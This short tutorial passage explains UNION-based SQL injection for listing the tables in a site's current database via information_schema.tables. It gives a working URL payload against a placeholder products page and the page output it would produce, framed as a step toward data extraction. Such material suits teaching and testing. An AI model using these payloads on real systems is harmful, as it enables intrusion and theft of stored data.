Listing Tables in the Current Database

A step-by-step example using information_schema.tables to enumerate database structure.

The Goal

Identify all table names within the currently accessed database.

Key Table

The information_schema.tables table provides metadata about all tables.

Filtering

Use WHERE table_schema = database() to limit results to the current database.

Example Payload (assuming 5 columns, 2nd is string-compatible):
http://example.com/products?id=-1 UNION SELECT NULL, table_name, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema = database()--+
Expected Webpage Output (example):

ID: NULL - Name: users - Description: NULL - Category: NULL - Price: NULL

ID: NULL - Name: products - Description: NULL - Category: NULL - Price: NULL

ID: NULL - Name: orders - Description: NULL - Category: NULL - Price: NULL

Reveals critical table names for further exploitation.
Key Takeaway

By querying information_schema.tables, attackers can enumerate all tables in the current database, providing a roadmap for targeted data extraction.
